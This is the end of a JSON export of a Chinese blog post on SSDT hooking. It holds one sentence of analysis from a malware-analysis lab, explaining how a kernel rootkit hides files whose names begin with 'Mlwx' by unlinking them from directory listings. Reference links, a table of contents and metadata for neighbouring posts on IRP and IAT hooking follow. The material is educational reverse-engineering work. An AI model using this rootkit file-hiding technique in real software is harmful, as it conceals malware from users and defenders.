ends</span><br></pre></td></tr></table></figure>\n\n<p>挂钩函数为sub_10486，其功能是调用RtlCompareMemory比较文件名（FileInformation+0x5E）开头四字节是否是（”Mlwx”），若是，则从_FILE_BOTH_DIR_INFORMATION链表中删除，以隐藏该文件</p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><ol>\n<li><a href=\"https://www.cnblogs.com/joneyyana/p/12585469.html\">https://www.cnblogs.com/joneyyana/p/12585469.html</a></li>\n<li><a href=\"https://blog.csdn.net/qq_38474570/article/details/103674271\">https://blog.csdn.net/qq_38474570/article/details/103674271</a></li>\n<li><a href=\"https://blog.csdn.net/qq_41988448/article/details/102994374\">https://blog.csdn.net/qq_41988448/article/details/102994374</a></li>\n<li><a href=\"https://cata1oc.github.io/2020/03/27/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%EF%BC%89/\">https://cata1oc.github.io/2020/03/27/API%E5%87%BD%E6%95%B0%E7%9A%84%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%EF%BC%88%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%EF%BC%89/</a></li>\n<li><a href=\"https://www.bilibili.com/video/BV1NJ411M7aE?p=41\">https://www.bilibili.com/video/BV1NJ411M7aE?p=41</a></li>\n<li><a href=\"https://blog.csdn.net/zahngzhic/article/details/131755579\">https://blog.csdn.net/zahngzhic/article/details/131755579</a></li>\n</ol>\n","text":"内核态代码只能被用户态的SYSCALL、SYSENTER或INT 0x2E指令来访问 程序进入0环后，有一个保存现场的过程，会将3环的各种寄存器都保存到一个叫做...","permalink":"/post/SSDT Hook","photos":[],"count_time":{"symbolsCount":"28k","symbolsTime":"25 mins."},"categories":[],"tags":[{"name":"hook技术","slug":"hook技术","count":7,"path":"api/tags/hook技术.json"},{"name":"逆向工程核心原理","slug":"逆向工程核心原理","count":7,"path":"api/tags/逆向工程核心原理.json"},{"name":"API hook","slug":"API-hook","count":5,"path":"api/tags/API-hook.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8\"><span class=\"toc-text\">系统服务表</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%E7%BB%93%E6%9E%84\"><span class=\"toc-text\">系统服务表结构</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E8%A1%A8%E4%BD%8D%E7%BD%AE\"><span class=\"toc-text\">系统服务表位置</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E5%8F%B7\"><span class=\"toc-text\">系统服务号</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SSDT\"><span class=\"toc-text\">SSDT</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#SSDT-amp-SSDT-Shadow\"><span class=\"toc-text\">SSDT&amp;SSDT Shadow</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%86%85%E6%A0%B8%E5%87%BD%E6%95%B0%E6%9F%A5%E6%89%BE\"><span class=\"toc-text\">内核函数查找</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">总结</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%87%BD%E6%95%B0%E6%9C%8D%E5%8A%A1%E5%8F%B7%E6%9F%A5%E6%89%BE%E4%B8%AD%E7%9A%84%E9%97%AE%E9%A2%98%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88\"><span class=\"toc-text\">函数服务号查找中的问题及解决方案</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Windbg%E2%80%94%E2%80%94ReadVirtual-not-properly-sign-extended\"><span class=\"toc-text\">Windbg——ReadVirtual: not properly sign extended</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8WinDbg%E8%8E%B7%E5%8F%96SSDT-%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1%E6%8F%8F%E8%BF%B0%E8%A1%A8%E7%9A%84%E5%87%BD%E6%95%B0%E6%9C%8D%E5%8A%A1%E5%8F%B7-%E7%B4%A2%E5%BC%95\"><span class=\"toc-text\">使用WinDbg获取SSDT 系统服务描述表的函数服务号(索引)</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SSDT-hook\"><span class=\"toc-text\">SSDT hook</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E2%80%94%E2%80%94Lab10-1\"><span class=\"toc-text\">《恶意代码分析实战》——Lab10.1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-Lab10-01-exe\"><span class=\"toc-text\">静态分析-Lab10-01.exe</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-Lab10-01-sys\"><span class=\"toc-text\">静态分析-Lab10-01.sys</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%BD%BF%E7%94%A8windbg%E5%88%86%E6%9E%90Lab10-01-sys\"><span class=\"toc-text\">使用windbg分析Lab10-01.sys</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E2%80%94%E2%80%94Lab10-2\"><span class=\"toc-text\">《恶意代码分析实战》——Lab10.2</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90-Lab10-02-exe\"><span class=\"toc-text\">静态分析-Lab10-02.exe</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%9F%A5%E6%89%BERootkit\"><span class=\"toc-text\">查找Rootkit</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%88%86%E6%9E%90%E6%8C%82%E9%92%A9%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">分析挂钩函数</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5\"><span class=\"toc-text\">参考链接</span></a></li></ol>","author":{"name":"0netry","slug":"blog-author","avatar":"/img/tree.png","link":"/","description":"0与1只在一念之间","socials":{"github":"https://github.com/0netry","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"IRP Hook","uid":"ba14c8c55e36720dc30bd604d682a355","slug":"IRP Hook","date":"2022-03-27T07:18:13.000Z","updated":"2025-06-05T12:21:20.608Z","comments":true,"path":"api/articles/IRP Hook.json","keywords":null,"cover":[],"text":"3环与0环通信（常规方式）本篇介绍一下3环与0环通信的原理（常规方式），介绍与之相关的结构体，对象等，最后代码实现并模拟操作系统进行3环和0环的通信。 设备对象...","permalink":"/post/IRP Hook","photos":[],"count_time":{"symbolsCount":"34k","symbolsTime":"31 mins."},"categories":[],"tags":[{"name":"hook技术","slug":"hook技术","count":7,"path":"api/tags/hook技术.json"},{"name":"逆向工程核心原理","slug":"逆向工程核心原理","count":7,"path":"api/tags/逆向工程核心原理.json"},{"name":"API hook","slug":"API-hook","count":5,"path":"api/tags/API-hook.json"}],"author":{"name":"0netry","slug":"blog-author","avatar":"/img/tree.png","link":"/","description":"0与1只在一念之间","socials":{"github":"https://github.com/0netry","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"IAT Hook","uid":"0f25dc3ea7a3ffec9ce07cef8295e4e2","slug":"IAT Hook","date":"2022-03-25T02:23:09.000Z","updated":"2025-06-05T12:20:03.574Z","comments":true,"path":"api/articles/IAT Hook.json","keywords":null,"cover":[],"text":"IAT Hook前置知识通过注入DLL文件来钩取某个API，DLL文件注入目标进程后，修改IAT来更改进程中调用的特定API功能。 API功能 kernel32...","permalink":"/post/IAT Hook","photos":[],"count_time":{"symbolsCount":"12k","symbolsTime":"11 mins."},"categories":[],"tags":[{"name":"hook技术","slug":"hook技术","count":7,"path":"api/tags/hook技术.json"},{"name":"逆向工程核心原理","slug":"逆向工程核心原理","count":7,"path":"api/tags/逆向工程核心原理.json"},{"name":"API hook","slug":"API-hook","count":5,"path":"api/tags/API-hook.json"}],"author":{"name":"0netry","slug":"blog-author","avatar":"/img/tree.png","link":"/","description":"0与1只在一念之间","socials":{"github":"https://github.com/0netry","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}